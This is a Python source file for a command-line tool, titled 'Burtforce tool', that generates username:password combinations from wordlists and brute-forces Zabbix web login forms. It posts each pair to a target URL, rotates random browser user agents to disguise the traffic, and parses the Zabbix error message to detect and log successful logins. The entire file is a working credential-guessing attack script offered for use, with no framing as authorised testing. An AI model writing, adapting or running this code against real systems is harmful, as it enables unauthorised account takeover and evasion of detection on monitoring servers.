import requests
import argparse
import time
import os
import sys
from bs4 import BeautifulSoup
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from colorama import Fore, Style, init
import pyfiglet

init(autoreset=True)

# Setup User-Agent rotator
software_names = [SoftwareName.CHROME.value]
operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
user_agent_rotator = UserAgent(
    software_names=software_names, operating_systems=operating_systems, limit=100
)


def get_lines(file_path):
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if line.strip():
                yield line.strip()


def count_lines(file_path):
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        return sum(1 for _ in f)


def generate_combinations(username_file, password_file, output_file):
    usernames = list(get_lines(username_file))
    passwords = list(get_lines(password_file))

    total = len(usernames) * len(passwords)
    processed = 0
    start_time = time.time()

    print(Fore.YELLOW + "\n[+] Generating combos...")

    with open(output_file, "w", encoding="utf-8") as f_out:
        try:
            for username in usernames:
                for password in passwords:
                    f_out.write(f"{username}:{password}\n")
                    processed += 1

                    if processed % 10000 == 0:
                        elapsed = time.time() - start_time
                        speed = processed / elapsed if elapsed > 0 else 0
                        remaining = (total - processed) / speed if speed > 0 else 0
                        print(
                            Fore.CYAN
                            + f"\rProgress: {processed:,}/{total:,} | Speed: {speed:,.0f} combos/s | Remaining: {remaining:.1f}s",
                            end="",
                        )

        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Combo generation interrupted.")
            sys.exit()

    print(Fore.GREEN + f"\n[✔] All combos saved to {output_file}")


def bruteforce_attack(target_url, combinations_file, delay=1):
    if not os.path.exists(combinations_file):
        print(Fore.RED + "[X] Combinations file not found!")
        return

    total = count_lines(combinations_file)
    suspicious_found = False

    print(Fore.YELLOW + f"\n[+] Starting brute force on {target_url}...")

    try:
        with open(combinations_file, "r", encoding="utf-8") as f, open(
            "suspicious_login_attempts.log", "a", encoding="utf-8"
        ) as log:
            for i, line in enumerate(f):
                if not line.strip():
                    continue

                try:
                    username, password = line.strip().split(":", 1)
                except ValueError:
                    continue

                headers = {
                    "User-Agent": user_agent_rotator.get_random_user_agent(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded",
                }

                data = {"name": username, "password": password, "enter": "Sign in"}

                try:
                    response = requests.post(
                        target_url, headers=headers, data=data, timeout=10
                    )
                    print(
                        Fore.WHITE
                        + f"\r[*] Test {i+1:,}/{total:,} | {username}:{password} | Status: {response.status_code}",
                        end="",
                    )

                    # HTML parsing with BeautifulSoup
                    soup = BeautifulSoup(response.text, "lxml")
                    error_div = soup.select_one(
                        "div.signin-container form ul li div.red"
                    )
                    error_text = error_div.get_text(strip=True) if error_div else ""

                    # Zabbix login failure check
                    if (
                        "Incorrect user name or password or account is temporarily blocked."
                        not in error_text
                    ):
                        print(
                            Fore.MAGENTA
                            + f"\n[!] Suspicious or successful login: {username}:{password}"
                        )
                        log.write(f"{username}:{password}\n")
                        suspicious_found = True
                        break

                except Exception as e:
                    print(Fore.RED + f"\n[!] Request error: {str(e)}")

                time.sleep(delay)

    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack interrupted.")
        sys.exit()

    if not suspicious_found:
        print(Fore.RED + "\n[X] No suspicious logins detected.")


def main():
    banner = pyfiglet.figlet_format("Burtforce tool")
    print(Fore.GREEN + banner)
    print(
        Fore.LIGHTCYAN_EX + ">> No Save File, No Mercy! DOM-based Zabbix checker <<\n"
    )

    parser = argparse.ArgumentParser(
        description="Generate combos and perform BruteForce attacks (no save file)."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    combo_parser = subparsers.add_parser(
        "generate", help="Generate username:password combinations"
    )
    combo_parser.add_argument("-u", "--usernames", required=True)
    combo_parser.add_argument("-p", "--passwords", required=True)
    combo_parser.add_argument("-o", "--output", default="combinations.txt")

    brute_parser = subparsers.add_parser(
        "bruteforce", help="Execute brute force attack"
    )
    brute_parser.add_argument("-t", "--target", required=True)
    brute_parser.add_argument("-c", "--combinations", required=True)
    brute_parser.add_argument("-d", "--delay", type=float, default=1)

    args = parser.parse_args()

    if args.command == "generate":
        generate_combinations(args.usernames, args.passwords, args.output)
    elif args.command == "bruteforce":
        bruteforce_attack(args.target, args.combinations, args.delay)


if __name__ == "__main__":
    main()
